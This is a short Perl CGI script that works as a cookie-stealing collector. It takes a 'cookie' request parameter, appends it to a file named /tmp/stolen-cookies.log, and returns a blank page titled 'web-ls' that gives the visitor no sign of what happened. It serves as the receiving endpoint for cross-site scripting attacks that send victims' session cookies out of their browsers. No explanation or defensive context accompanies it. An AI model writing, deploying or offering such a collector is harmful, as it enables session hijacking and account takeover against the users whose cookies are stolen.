#!/usr/bin/perl

use strict;
use CGI qw(:standard escapeHTML);

my $cookie = param("cookie");
$cookie =~ s/;/\n/;

my $f = "/tmp/stolen-cookies.log";

open FILE, ">> $f";

print FILE "---------------\n";
print FILE "$cookie\n";
print FILE "---------------\n";

print header, start_html("web-ls");
print end_html;

